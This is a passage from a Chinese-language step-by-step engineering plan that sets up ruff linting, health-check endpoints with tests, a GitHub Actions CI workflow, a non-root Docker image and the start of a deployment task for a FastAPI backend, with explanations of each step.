Expected: 输出 `mysql asyncmy`。编写计划时在 Windows 上验证过：0.2.12 的 C 扩展能正常加载，连一个不存在的端口时，得到的是正常的 `OperationalError`。

- [ ] **Step 3: 新建检查工具清单**

创建 `backend/requirements-tools.txt`：

```
# CI 与本地开发用的检查工具，不进生产镜像。本地安装：pip install -r backend/requirements-tools.txt
ruff==0.16.7
shellcheck-py==0.11.0.1
hadolint-py==2.15.1.2
pip-audit==2.10.1
```

这些工具只在开发和 CI 里用，单独放一个文件，**不装进生产镜像**，镜像更小，攻击面也更小。版本全部固定，本地和 CI 跑的是同一个版本，结果才一致；Dependabot（Task 10）会负责升级它们。

actionlint 没有放进来：它在 PyPI 上只有源码包，安装时要再去 GitHub 下载二进制文件，在 CI 里不够稳定。CI 会直接下载官方 release 并校验 SHA-256（Task 7）。本地想用的话，可以执行 `pip install actionlint-py`。

```bash
pip install -r backend/requirements-tools.txt
```

- [ ] **Step 4: 提交**

```bash
git add backend/requirements.txt backend/requirements-tools.txt
git commit -m "fix: asyncmy 升级到 0.2.12（Linux/3.14 有 wheel），新增检查工具清单"
```

---

## Task 5: 静态检查基线

**为什么**：静态检查不运行代码，只读代码就能发现一类确定的问题，比如导入了没用、用了没定义的名字。在 CI 里，它通常是最快的一道关卡，几秒钟就能跑完。

**关键在于怎么开始**：规则开得太多，第一次就报几百条，没人会去修，最后只能关掉。所以先只开「几乎不会误报」的两类规则，把现有的问题清零，让它从第一天起就是绿色的；以后再一类一类地加规则。

**Files:**
- Create: `backend/ruff.toml`
- Modify: ruff 自动修复涉及的 8 个文件

- [ ] **Step 1: 写配置**

**知识点**：K7 静态检查与渐进式启用规则

创建 `backend/ruff.toml`：

```toml
# ruff 静态检查配置。本地与 CI 的 lint job 读的是同一份，保证结果一致
target-version = "py314"

[lint]
# 先只开「几乎不会误报」的两类，保证一上线就是绿色、每条报错都值得改：
#   F  = pyflakes：未使用的导入和变量、未定义的名字、没有占位符的 f-string 等
#   E9 = 语法错误
# 代码稳定后再逐步加规则，例如 B（常见 bug 模式）、I（import 排序）、UP（升级到新语法）
select = ["F", "E9"]
```

- [ ] **Step 2: 看基线**

Run: `cd backend && ruff check --statistics .`
Expected:
```
13	F401	[*] unused-import
 2	F541	[*] f-string-missing-placeholders
Found 15 errors.
```

`[*]` 表示这一条可以自动修复。

- [ ] **Step 3: 自动修复并核对**

```bash
cd backend
ruff check --fix .
ruff check .
git diff
```

Expected: 修复后 `All checks passed!`。`git diff` 应当正好是下面这些改动（这里去掉了换行符差异）：

```diff
--- a/backend/agents/agent/analyse_agent.py
+++ b/backend/agents/agent/analyse_agent.py
@@ -1 +0,0 @@
-import json
--- a/backend/agents/agent/image_gene_agent.py
+++ b/backend/agents/agent/image_gene_agent.py
@@ -1 +0,0 @@
-import json
--- a/backend/agents/memory/short_term_memory.py
+++ b/backend/agents/memory/short_term_memory.py
@@ -33 +33 @@
-from redis.exceptions import AuthenticationError, RedisError
+from redis.exceptions import RedisError
--- a/backend/agents/tools/common_tool.py
+++ b/backend/agents/tools/common_tool.py
@@ -1 +1 @@
-from typing import Type, Any
+from typing import Type
--- a/backend/dao/user_profile_mapper.py
+++ b/backend/dao/user_profile_mapper.py
@@ -1 +0,0 @@
-from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker  # 补充导入
@@ -7 +6 @@
-from typing import Optional, Dict, Any, List
+from typing import Optional
@@ -11 +9,0 @@
-from fastapi import Depends
--- a/backend/tests/test_memory_manager.py
+++ b/backend/tests/test_memory_manager.py
@@ -75 +75 @@
-    await manager.add_memory(USER,SESSION,MemoryUnit(f'问题2',f'回答2'))
+    await manager.add_memory(USER,SESSION,MemoryUnit('问题2','回答2'))
--- a/backend/tests/test_short_term_memory.py
+++ b/backend/tests/test_short_term_memory.py
@@ -3 +2,0 @@
-from typing import List, Any
--- a/backend/tests/test_tools_sync_disabled.py
+++ b/backend/tests/test_tools_sync_disabled.py
@@ -2 +1,0 @@
-from sympy import Lambda
```

自动修复也要人工看一遍。删除「未使用的导入」有一个经典的风险：有些模块专门靠被导入来产生副作用，比如注册插件。这 13 处都不是这种情况，其中 `from sympy import Lambda` 是 IDE 自动补全误加的。

- [ ] **Step 4: 修复后跑测试**

Run: `cd backend && python -m pytest tests/ -v`
Expected: 与修复前结果相同

- [ ] **Step 5: 提交**

```bash
git add backend/ruff.toml backend/agents backend/dao backend/tests
git commit -m "refactor: 引入 ruff 静态检查（F、E9 两类），清理未使用的导入"
```

---

## Task 6: 健康检查接口

**为什么**：自动部署要回答一个问题：新版本真的起来了吗？容器在运行不代表服务可用。数据库连不上时进程还活着，但每个请求都会失败。所以需要一个接口，让部署脚本（Task 9）和容器编排来问。

**两个接口，回答两个不同的问题**：
- `GET /health`：**存活检查**。进程活着、能响应就返回 200，不碰任何外部依赖。容器的 `HEALTHCHECK` 用它：数据库短暂抖动时，进程本身没坏，不该被当成「死了」而反复重启
- `GET /health/ready`：**就绪检查**。Redis 和 MySQL 都连得上才返回 200，否则返回 503。部署脚本用它：依赖必须都通，才能判定新版本上线成功

**Files:**
- Create: `backend/api/health_api.py`
- Create: `backend/tests/test_health.py`
- Modify: `backend/main.py`（两行）

**Interfaces:**
- Produces:
  - `GET /health` → `200 {"status": "ok"}`
  - `GET /health/ready` → `200 {"status": "ok", "checks": {"redis": "ok", "database": "ok"}}`；有依赖不通时返回 `503`，`status` 为 `"unavailable"`，`checks` 里对应的一项为 `"error: <异常类型>"`
  - 模块级变量 `CHECKS: dict[str, 协程函数]` 和 `CHECK_TIMEOUT`，测试时可以替换

- [ ] **Step 1: 写失败的测试**

**知识点**：K8 存活检查与就绪检查

创建 `backend/tests/test_health.py`：

```python
import asyncio

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

import backend.api.health_api as health


async def _ok():
    return None


async def _refused():
    raise ConnectionRefusedError("redis://:secret-password@10.0.0.5:6379")


async def _hang():
    await asyncio.sleep(30)


@pytest.fixture
def client():
    """只挂健康检查路由的最小应用：不触发 main.py 的启动钩子（建表、连库）"""
    app = FastAPI()
    app.include_router(health.health_router)
    return TestClient(app)


def test_liveness_does_not_touch_dependencies(client, monkeypatch):
    monkeypatch.setattr(health, "CHECKS", {"redis": _refused, "database": _refused})
    response = client.get("/health")
    assert response.status_code == 200
    assert response.json() == {"status": "ok"}


def test_ready_when_all_dependencies_are_up(client, monkeypatch):
    monkeypatch.setattr(health, "CHECKS", {"redis": _ok, "database": _ok})
    response = client.get("/health/ready")
    assert response.status_code == 200
    assert response.json() == {"status": "ok", "checks": {"redis": "ok", "database": "ok"}}


def test_not_ready_when_a_dependency_is_down(client, monkeypatch):
    monkeypatch.setattr(health, "CHECKS", {"redis": _refused, "database": _ok})
    response = client.get("/health/ready")
    assert response.status_code == 503
    assert response.json()["checks"] == {"redis": "error: ConnectionRefusedError", "database": "ok"}


def test_error_details_are_not_leaked(client, monkeypatch):
    """异常信息里可能有密码、内网地址，健康检查只能返回异常类型"""
    monkeypatch.setattr(health, "CHECKS", {"redis": _refused})
    body = client.get("/health/ready").text
    assert "secret-password" not in body and "10.0.0.5" not in body


def test_hanging_dependency_times_out(client, monkeypatch):
    monkeypatch.setattr(health, "CHECK_TIMEOUT", 0.1)
    monkeypatch.setattr(health, "CHECKS", {"database": _hang})
    response = client.get("/health/ready")
    assert response.status_code == 503
    assert response.json()["checks"] == {"database": "error: TimeoutError"}


def test_main_app_serves_health_routes():
    from backend.main import app
    paths = {route.path for route in app.routes}
    assert {"/health", "/health/ready"} <= paths
```

几个测试设计上的考虑：
- **只挂健康检查路由的最小应用**：`TestClient(main.app)` 会触发 `main.py` 的启动钩子，去连 MySQL 建表，测试就依赖真实数据库了
- **替换 `CHECKS`，而不是真的去连 Redis 和 MySQL**：要测的是「依赖不通时接口返回什么」，而不是「Redis 能不能连上」
- **`test_error_details_are_not_leaked`**：Redis 的连接错误里可能带着密码和内网地址，健康检查接口通常没有鉴权，只能返回异常类型

- [ ] **Step 2: 运行测试确认失败**

Run: `cd backend && python -m pytest tests/test_health.py -v`
Expected: 收集阶段报 `ModuleNotFoundError: No module named 'backend.api.health_api'`

- [ ] **Step 3: 实现**

创建 `backend/api/health_api.py`：

```python
"""
健康检查接口。部署脚本和容器编排靠它判断服务能不能用：

- GET /health        存活检查（liveness）：进程活着、能响应请求就返回 200，不碰任何外部依赖
- GET /health/ready  就绪检查（readiness）：Redis 与 MySQL 都连得上才返回 200，否则 503

分成两个接口，是因为两者回答的问题不同：数据库短暂抖动时进程本身没坏，
不该被当成「死了」而反复重启；但部署时必须确认依赖都通，才能判定新版本上线成功。
"""
import asyncio

from fastapi import APIRouter
from fastapi.responses import JSONResponse
from sqlalchemy import text

from backend.model import engine
from backend.utils.redis_client import get_redis_client

health_router = APIRouter(prefix="/health", tags=["health"])

# 单项检查的限时：依赖卡住时，健康检查本身不能跟着卡住
CHECK_TIMEOUT = 2.0


async def check_redis() -> None:
    await get_redis_client().client.ping()


async def check_database() -> None:
    async with engine.connect() as conn:
        await conn.execute(text("SELECT 1"))


CHECKS = {"redis": check_redis, "database": check_database}


async def _run_check(check) -> str:
    try:
        await asyncio.wait_for(check(), timeout=CHECK_TIMEOUT)
        return "ok"
    except Exception as e:
        # 只返回异常类型，不返回异常内容：内容里可能带连接串、主机名等内部信息
        return f"error: {type(e).__name__}"


@health_router.get("")
async def liveness() -> dict:
    return {"status": "ok"}


@health_router.get("/ready")
async def readiness() -> JSONResponse:
    names = list(CHECKS)
    outcomes = await asyncio.gather(*(_run_check(CHECKS[name]) for name in names))
    checks = dict(zip(names, outcomes))
    ready = all(v == "ok" for v in checks.values())
    return JSONResponse(
        status_code=200 if ready else 503,
        content={"status": "ok" if ready else "unavailable", "checks": checks},
    )
```

- `asyncio.gather`：并发执行各项检查，总耗时约等于最慢的一项，而不是全部相加
- `asyncio.wait_for`：给每项检查限时。依赖卡住时，健康检查本身不能跟着卡住，否则部署脚本的等待就失去了意义

Run: `cd backend && python -m pytest tests/test_health.py -v`
Expected: 5 passed、1 failed，失败的是 `test_main_app_serves_health_routes`，因为路由还没挂进主应用

- [ ] **Step 4: 挂进主应用**

在 `backend/main.py` 里，`from backend.api.user_api.login_api import login_router` 的下一行加入：

```python
from backend.api.health_api import health_router
```

在 `app.include_router(login_router)` 的下一行加入：

```python
app.include_router(health_router)
```

- [ ] **Step 5: 运行测试确认通过**

Run: `cd backend && python -m pytest tests/test_health.py -v`
Expected: 6 passed

- [ ] **Step 6: 提交**

```bash
git add backend/api/health_api.py backend/tests/test_health.py backend/main.py
git commit -m "feat: 新增存活检查与就绪检查接口"
```

---

## Task 7: CI 工作流

这是整个计划的核心。做完这个任务，每次推送都会自动跑三个 job：静态检查、后端测试、前端构建。

**Files:**
- Create: `backend/.coveragerc`
- Create: `.github/workflows/ci.yml`

**Interfaces:**
- Consumes: Task 2 的 `REQUIRE_REDIS`；Task 3 的 `JWT_SECRET_KEY`；Task 4 的 `requirements-tools.txt`；Task 5 的 `ruff.toml`
- Produces:
  - job 名称（也就是 Task 13 分支保护里要勾选的检查名）：`静态检查`、`后端测试`、`前端构建`
  - `on.workflow_call`：Task 12 的 `release.yml` 用 `uses: ./.github/workflows/ci.yml` 调用它

- [ ] **Step 1: 覆盖率配置**

**知识点**：K15 运行结果的呈现

创建 `backend/.coveragerc`：

```ini
# 覆盖率配置：统计 backend 包，排除测试代码本身（测试文件总是 100% 被执行，算进来会虚高）
[run]
source = backend
omit =
    */tests/*
```

先在本机试一下 CI 里要用的命令：

```bash
cd backend
python -m pytest --cov --cov-report=term-missing:skip-covered --cov-report=xml:coverage.xml --junitxml=junit.xml tests/test_health.py
python -m coverage report --format=markdown | head -5
```

Expected: 生成 `coverage.xml` 和 `junit.xml`；最后一条输出的是 Markdown 表格，里面没有 `tests/` 开头的行。

这两个报告文件和覆盖率数据文件 `.coverage` 都是运行时产生的，不该提交。在仓库根目录的 `.gitignore` 末尾追加三行：

```
backend/coverage.xml
backend/junit.xml
backend/.coverage
```

- [ ] **Step 2: 写 workflow**

**知识点**：K9 基本结构、K10 触发器、K11 最小权限、K12 并发控制、K13 依赖缓存、K14 服务容器、K15 结果呈现、K21 下载校验

创建 `.github/workflows/ci.yml`：

```yaml
name: CI

on:
  pull_request:
    branches: [main]
  push:
    branches-ignore: [main]      # main 的推送由 release.yml 负责，它会先调用本 workflow 跑一遍检查
    paths:
      - "backend/**"
      - "frontend/**"
      - "deploy/**"
      - "Dockerfile"
      - ".dockerignore"
      - ".github/workflows/**"
  workflow_call:                 # 允许 release.yml 以 uses: ./.github/workflows/ci.yml 调用

permissions:
  contents: read                 # 默认最小权限：只读代码；需要更多权限的 job 单独声明

concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

env:
  PYTHON_VERSION: "3.14"

jobs:
  lint:
    name: 静态检查
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-python@v7
        with:
          python-version: ${{ env.PYTHON_VERSION }}
          cache: pip
          cache-dependency-path: backend/requirements-tools.txt

      - name: 安装检查工具
        run: pip install -r backend/requirements-tools.txt

      - name: ruff（Python 代码）
        working-directory: backend
        run: ruff check --output-format=github .

      - name: actionlint（workflow 文件本身）
        env:
          ACTIONLINT_VERSION: 1.7.12
          ACTIONLINT_SHA256: 8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8
        run: |
          curl -sSfL -o actionlint.tar.gz \
            "https://github.com/rhysd/actionlint/releases/download/v${ACTIONLINT_VERSION}/actionlint_${ACTIONLINT_VERSION}_linux_amd64.tar.gz"
          echo "${ACTIONLINT_SHA256}  actionlint.tar.gz" | sha256sum -c -
          tar -xzf actionlint.tar.gz actionlint
          ./actionlint -color

  test:
    name: 后端测试
    runs-on: ubuntu-latest
    timeout-minutes: 20
    services:
      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 5s
          --health-timeout 3s
          --health-retries 10
    env:
      REQUIRE_REDIS: "1"                  # Redis 连不上就失败，不许静默跳过
      REDIS_HOST: localhost
      REDIS_PORT: "6379"
      # 下面都是占位值：测试不连 MySQL、不调大模型，只为满足模块导入时的配置检查
      SQL_DATABASE_URL: mysql+asyncmy://ci:ci@127.0.0.1:3306/ci
      API_KEY: ci-placeholder
      API_URL: http://127.0.0.1:9/v1
      MODEL_NAME: ci-model
      EMBEDDING_MODEL: ci-embedding
      JWT_SECRET_KEY: ci-placeholder-secret
      ANONYMIZED_TELEMETRY: "False"
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-python@v7
        with:
          python-version: ${{ env.PYTHON_VERSION }}
          cache: pip
          cache-dependency-path: backend/requirements.txt

      - name: 安装依赖
        run: pip install -r backend/requirements.txt

      - name: 运行测试
        working-directory: backend
        run: >-
          python -m pytest -v -rs
          --cov --cov-report=term-missing:skip-covered --cov-report=xml:coverage.xml
          --junitxml=junit.xml

      - name: 覆盖率写入运行摘要
        if: always()
        working-directory: backend
        run: |
          if [ -f .coverage ]; then
            echo "## 后端覆盖率" >> "$GITHUB_STEP_SUMMARY"
            python -m coverage report --format=markdown >> "$GITHUB_STEP_SUMMARY"
          fi

      - name: 上传测试报告
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: backend-test-reports
          path: |
            backend/junit.xml
            backend/coverage.xml
          if-no-files-found: ignore
          retention-days: 14

  frontend:
    name: 前端构建
    runs-on: ubuntu-latest
    timeout-minutes: 10
    defaults:
      run:
        working-directory: frontend
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-node@v7
        with:
          node-version: "24"
          cache: npm
          cache-dependency-path: frontend/package-lock.json

      - run: npm ci
      - run: npm run build
```

**逐段解释**

**① 基本结构（K9）**。一个 workflow 由若干个 **job** 组成，每个 job 在一台全新的虚拟机（**runner**）上执行，`runs-on: ubuntu-latest` 指定用哪种机器。job 里是按顺序执行的 **step**：要么 `uses:` 一个现成的 Action，要么 `run:` 一段 shell 命令。三个 job 之间没有写 `needs`，所以它们**并行**执行，总耗时取决于最慢的那个。

**② 触发器（K10）**
- `pull_request: branches: [main]`：有指向 main 的 PR，或者 PR 有新提交时触发
- `push: branches-ignore: [main]`：推送到 main 以外的分支时触发。main 被排除，是因为 main 的推送由 `release.yml` 负责，它会调用本 workflow，不排除的话会跑两遍
- `paths`：只有改动涉及这些路径时，push 才会触发，只改文档不会浪费一次 CI。**注意：`paths` 只加在 `push` 上，没有加在 `pull_request` 上。** 开启分支保护（Task 13）以后，PR 必须等必需检查报告结果；如果某个 PR 因为 `paths` 没有触发 CI，检查就永远处于「等待中」，PR 也永远合并不了
- `workflow_call`：让本 workflow 可以被别的 workflow 调用（Task 12）

**③ 最小权限（K11）**。每次运行，GitHub 都会自动生成一个临时令牌 `GITHUB_TOKEN`，供 Action 访问仓库。`permissions: contents: read` 把它的权限限制为只读代码。万一某个第三方 Action 被人投毒，它能拿到的也只是一个只读令牌。

**④ 并发控制（K12）**。`concurrency.group` 相同的运行同一时间只保留一个。`cancel-in-progress` 只在 PR 上开启：同一个 PR 连推几次提交时，旧的运行没有意义了，直接取消，省时间。推送到分支时不取消，每个提交都保留完整的检查记录。

**⑤ 依赖缓存（K13）**。`setup-python` 的 `cache: pip` 会把 pip 的下载缓存存到 GitHub，缓存的键由 `cache-dependency-path` 指定文件的哈希决定。requirements.txt 没变，下次就直接用缓存，不用重新下载 149 个包；变了，缓存自动失效。缓存的是「下载好的安装包」，安装这一步仍然要做。

**⑥ 服务容器（K14）**。`services.redis` 会在 job 开始前启动一个 Redis 容器。`ports: 6379:6379` 把容器端口映射到 runner 上，所以测试连 `localhost:6379` 就行。这是因为 job 直接跑在 runner 上；如果 job 本身也跑在容器里（写了 `container:`），就要用服务名 `redis` 作为主机名。`options` 里的 `--health-*` 会让 GitHub 等到 Redis 真正可用了，才开始执行 step，避免测试比 Redis 启动得还快。

**⑦ 占位配置**。`env` 里全是假值，只为满足「导入模块时就检查配置」这类代码（比如 `backend/model/__init__.py` 要求 `SQL_DATABASE_URL` 非空）。测试本身不连 MySQL、不调大模型。**真实密钥永远不要放进 CI 的测试 job**：PR 可能来自任何人，他们提交的测试代码可以把环境变量打印出来。

**⑧ 结果呈现（K15）**
- `ruff check --output-format=github` 会输出 `::error file=...,line=...::` 格式的文本，GitHub 把它识别为**注解**，直接标在 PR 的「Files changed」对应的代码行上
- `$GITHUB_STEP_SUMMARY` 是一个文件，写进去的 Markdown 会显示在这次运行的摘要页面上，这里用来放覆盖率表格
- `upload-artifact` 把测试报告存 14 天，可以在运行页面下载
- `if: always()` 的意思是：前面的测试失败了，这一步也照样执行。测试失败的时候，恰恰最需要看报告

**⑨ 下载校验（K21）**。actionlint 直接从 GitHub release 下载，下载后用 `sha256sum -c` 核对官方公布的校验和。万一下载被篡改或者文件损坏，这一步会直接失败，而不是去运行一个来历不明的程序。

**⑩ 前端**。仓库里的 `frontend/` 是 Vue 3 + Vite 项目。`npm ci` 严格按照 `package-lock.json` 安装，比 `npm install` 更适合 CI：锁文件和 `package.json` 对不上时，它会报错，而不是悄悄改掉锁文件。前端现在只做构建检查，不部署。

- [ ] **Step 3: 本地检查 workflow 文件**

**知识点**：K21 供应链安全

```bash
pip install actionlint-py
actionlint
```

Expected: 没有输出。`shellcheck-py`（Task 4）会把 `shellcheck` 装进虚拟环境，actionlint 能找到它，并顺带检查 `run:` 里的 shell 脚本。

actionlint 有一个局限：它内置了常用 Action 的参数表，但编写本计划时（actionlint 1.7.12），表里还没有这批 Action 的 v7 版本，所以不会检查 `with:` 里的参数名写没写错。本计划的参数都已经对照官方 `action.yml` 核对过。以后自己修改时，要去对应 Action 的仓库查一下。

- [ ] **Step 4: 推送，看它第一次运行**

```bash
git add backend/.coveragerc .github/workflows/ci.yml .gitignore
git commit -m "feat: 新增 CI 工作流（静态检查、带 Redis 的后端测试、前端构建）"
git push origin backend
```

打开仓库的 **Actions** 页面，找到 CI 的这次运行。Expected:
- 三个 job 全部绿色
- 「后端测试」的日志里，依赖 Redis 的测试都是 PASSED，没有 SKIPPED（`test_tools_sync_disabled.py` 那一条 skip 是代码里写死的，与 Redis 无关）
- 运行摘要页面有「后端覆盖率」表格；页面底部的 Artifacts 里有 `backend-test-reports`

第二次推送时，「安装依赖」这一步应该明显变快，因为命中了 pip 缓存。

---

## Task 8: Docker 镜像

**为什么用镜像部署**：镜像把「Python 3.14 + 149 个固定版本的依赖 + 代码」打成一个不可变的包。在 CI 里测过的是哪个镜像，部署到服务器上的就是哪个镜像，不会出现「我电脑上好好的」这种问题。回滚也只是把旧镜像换回来，不用在服务器上重新装依赖。

**Files:**
- Create: `Dockerfile`、`.dockerignore`（仓库根目录）
- Modify: `.github/workflows/ci.yml`（lint job 加一步、新增 image job）

**Interfaces:**
- Consumes: Task 4 的 asyncmy 0.2.12；Task 6 的 `/health`
- Produces:
  - 镜像约定：工作目录 `/app`，以 uid 10001 运行，监听 8000 端口，可写目录为 `/app/vector_memory` 和 `/app/backend/logs`
  - 启动命令：`python -m uvicorn backend.main:app --host 0.0.0.0 --port 8000`
  - 配置全部来自环境变量，镜像里没有 `.env`

- [ ] **Step 1: 写 Dockerfile**

**知识点**：K16 Docker 镜像

创建 `Dockerfile`：

```dockerfile
# 后端服务镜像。构建上下文是仓库根目录：代码用 backend.* 绝对导入，镜像里必须保留 backend/ 这一层目录
FROM python:3.14-slim

ENV PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    PIP_NO_CACHE_DIR=1 \
    PIP_DISABLE_PIP_VERSION_CHECK=1 \
    ANONYMIZED_TELEMETRY=False

WORKDIR /app

# 先只复制依赖清单并安装：依赖没变时，这一层直接命中缓存，改业务代码不会触发重新安装
COPY backend/requirements.txt backend/requirements.txt
RUN pip install -r backend/requirements.txt

COPY backend/ backend/

# 用普通用户运行；提前建好运行时要写的目录并交给它（向量库、日志）
RUN useradd --create-home --uid 10001 app \
    && mkdir -p /app/vector_memory /app/backend/logs \
    && chown -R app:app /app/vector_memory /app/backend/logs
USER 10001

EXPOSE 8000

# slim 镜像里没有 curl，用 Python 自带的 urllib 做存活检查
HEALTHCHECK --interval=30s --timeout=5s --start-period=60s --retries=3 \
    CMD ["python", "-c", "import urllib.request; urllib.request.urlopen('http://127.0.0.1:8000/health', timeout=4)"]

CMD ["python", "-m", "uvicorn", "backend.main:app", "--host", "0.0.0.0", "--port", "8000"]
```

**逐段解释**

- **构建上下文是仓库根目录**：代码里写的都是 `from backend.xxx import ...` 这种绝对导入，所以镜像里必须保留 `backend/` 这一层目录，并且从 `/app` 启动 `backend.main:app`。CLAUDE.md 里写的 `cd backend && uvicorn main:app` 在容器里行不通
- **分层缓存**：Dockerfile 的每条指令是一层，某一层的输入没变，就直接复用上次的结果。先 `COPY requirements.txt` 再 `pip install`，最后才 `COPY backend/`：只改业务代码时，最慢的「安装依赖」这一层能命中缓存。顺序反过来的话，改一行代码都要重装全部依赖
- **`ENV`**：`PYTHONUNBUFFERED=1` 让日志立即输出，不在缓冲区里攒着，否则 `docker logs` 看不到最新的日志；`PIP_NO_CACHE_DIR=1` 不在镜像里留 pip 缓存，镜像更小；`ANONYMIZED_TELEMETRY=False` 关掉 chromadb 的遥测
- **非 root 用户**：容器默认以 root 运行，应用一旦被攻破，攻击者在容器里就是 root。`USER 10001` 用数字 UID，而不是用户名：有些环境（比如 k8s 的 `runAsNonRoot`）只认数字，hadolint 也会对用户名给出提示（DL3066）
- **只把需要写入的目录交给应用用户**：向量库目录 `/app/vector_memory`（留给 RAG，记忆层已改存 MySQL）和日志目录 `/app/backend/logs`，其余代码对应用用户只读。编写计划时核对过：LlamaIndex 需要的 NLTK 数据随 wheel 发布，运行时不会去写包目录
- **`HEALTHCHECK`**：Docker 每 30 秒访问一次 `/health`，连续 3 次失败就把容器标记为 unhealthy。slim 镜像里没有 curl，所以用 Python 自带的 urllib。`start-period=60s` 给应用留出启动时间，这期间的失败不计数

- [ ] **Step 2: 写 .dockerignore**

**知识点**：K16

创建 `.dockerignore`：

```
# 构建上下文里只需要 backend/ 的代码；其余一律不发给 Docker，既加快构建，也防止密钥被打进镜像
**/__pycache__
**/*.pyc
.git
.github
.idea
docs
deploy
frontend
**/.env
backend/.venv
backend/tests
backend/logs
backend/vector_memory
backend/chroma_db
backend/rag_db
backend/rag_uploads
backend/rag_eval
backend/test_stream.py
```

`docker build` 会先把整个构建上下文打包发给 Docker。`.dockerignore` 有两个作用：
1. 不发送用不到的东西（`.venv` 可能有好几 GB），构建更快
2. **防止密钥进入镜像**：`**/.env` 保证即使哪天有人写了 `COPY . .`，`.env` 也不会被打包进去。镜像一旦推送到仓库，拿到镜像的人就能从里面把文件读出来

- [ ] **Step 3: 静态检查 Dockerfile**

```bash
hadolint Dockerfile
```

Expected: 没有输出（`hadolint-py` 已在 Task 4 装好）。

- [ ] **Step 4: 在 CI 里加上 Dockerfile 检查和镜像构建**

**知识点**：K17 Buildx 与 GitHub Actions 缓存

在 `ci.yml` 的 lint job 里，`actionlint` 那一步之前插入：

```yaml
      - name: hadolint（Dockerfile）
        run: hadolint Dockerfile
```

在 `ci.yml` 末尾（`frontend` job 之后）追加一个 job：

```yaml
  image:
    name: 镜像构建检查
    # 只在 PR 上检查 Dockerfile 能不能构建、镜像能不能启动；合并到 main 后由 release.yml 构建并推送
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v7

      - uses: docker/setup-buildx-action@v4

      - name: 构建镜像（不推送）
        uses: docker/build-push-action@v7
        with:
          context: .
          push: false
          load: true                      # 把镜像加载进本机 Docker，下一步才能 docker run
          tags: question-set-program:ci
          cache-from: type=gha
          cache-to: type=gha,mode=max

      - name: 镜像冒烟测试：能导入应用
        run: >-
          docker run --rm
          -e SQL_DATABASE_URL=mysql+asyncmy://ci:ci@127.0.0.1:3306/ci
          -e API_KEY=ci-placeholder -e API_URL=http://127.0.0.1:9/v1
          -e JWT_SECRET_KEY=ci-placeholder-secret
          question-set-program:ci
          python -c "import backend.main; print('镜像内应用导入成功')"
```

- **`if: github.event_name == 'pull_request'`**：只在 PR 上构建。合并后由 `release.yml` 构建真正要发布的镜像，没必要在每次推送时都构建一遍
- **`docker/setup-buildx-action`**：启用 BuildKit 构建器，它支持把缓存导出到外部
- **`cache-from/cache-to: type=gha`**：把镜像的层缓存存进 GitHub Actions 的缓存服务。runner 每次都是全新的机器，本地没有任何缓存，不这样做的话，每次都要从头安装 149 个依赖。`mode=max` 连中间层也一起缓存
- **`load: true`**：把构建好的镜像加载进 runner 本机的 Docker，下一步才能 `docker run`
- **冒烟测试**：以镜像里的非 root 用户、在 `/app` 下导入整个应用。它能发现「本机好好的，镜像里坏了」这一类问题：少了系统库、目录没有写权限、导入路径不对。这里不启动服务，因为启动钩子要连 MySQL

- [ ] **Step 5: 开 PR，看镜像第一次构建**

```bash
actionlint
git add Dockerfile .dockerignore .github/workflows/ci.yml
git commit -m "feat: 新增后端 Docker 镜像，PR 上检查镜像能否构建"
git push origin backend
```

在 GitHub 上开一个 `backend → main` 的 PR，先不要合并。Expected: PR 页面出现四个检查，「镜像构建检查」通过，日志最后一行是「镜像内应用导入成功」。

**这是这份计划第一次真正构建镜像**，编写时本机没有 Docker。如果失败，最可能的原因和查法：
- `pip install` 失败：看是哪个包在 Linux 上缺 wheel，参照 Task 4 Step 1 的方法检查
- 冒烟测试报 `Permission denied`：说明应用还往 `/app/vector_memory` 和 `/app/backend/logs` 之外的目录写了东西，按报错的路径补一个 `mkdir` 和 `chown`

---

## Task 9: 部署脚本

> **已由部署计划取代，跳过本任务**：由部署计划的 Task 3 取代（见 `docs/superpowers/plans/2026-09-15-production-deployment.md`）。

**为什么部署逻辑写成服务器上的脚本，而不直接写在 workflow 里**：
1. 可以测试：脚本可以在本机用「桩」测试（见下文），workflow 里的一串 ssh 命令没法测试
2. 可以手动执行：半夜 GitHub 出故障时，登录服务器执行 `bash deploy.sh <旧版本>` 就能回滚，不依赖 GitHub
3. workflow 只负责「传文件、调脚本」，逻辑集中在一个地方

**Files:**
- Create: `deploy/docker-compose.yml`、`deploy/deploy.sh`、`deploy/test_deploy.sh`
- Modify: `.github/workflows/ci.yml`（lint job 和 test job 各加一步）

**Interfaces:**
- Consumes: Task 6 的 `/health/ready`；Task 8 的镜像约定
- Produces:
  - `deploy.sh <镜像>`：只接受 `ghcr.io/<名称>:sha-<7位十六进制>`，否则以退出码 2 退出。成功时退出码为 0，并把镜像写入同目录的 `.current_image`；就绪检查失败时自动回滚到 `.current_image` 里记录的版本，退出码为 1
  - 可调参数（环境变量）：`READY_URL`（默认 `http://127.0.0.1:8000/health/ready`）、`HEALTH_RETRIES`（默认 30）、`HEALTH_INTERVAL`（默认 2 秒）
  - 服务器部署目录的约定：`docker-compose.yml`、`deploy.sh`、`.env`、`.current_image` 放在同一个目录下

- [ ] **Step 1: 写编排文件**

**知识点**：K19 Docker Compose 与具名卷

创建 `deploy/docker-compose.yml`：

```yaml
# 服务器上的编排文件。部署时会被仓库里的最新版覆盖；密钥不写在这里，放在同目录的 .env 里。
services:
  app:
    # 镜像版本由 deploy.sh 通过环境变量 IMAGE 传入；没传就直接报错，避免误用 latest
    image: ${IMAGE:?请通过 deploy.sh 部署，它会设置 IMAGE}
    restart: unless-stopped
    env_file: .env
    ports:
      - "8000:8000"
    volumes:
      # 用具名卷而不是绑定宿主机目录：首次挂载时 Docker 会按镜像里的属主初始化，
      # 容器里的非 root 用户（uid 10001）可以直接写入
      - vector_memory:/app/vector_memory
      - app_logs:/app/backend/logs
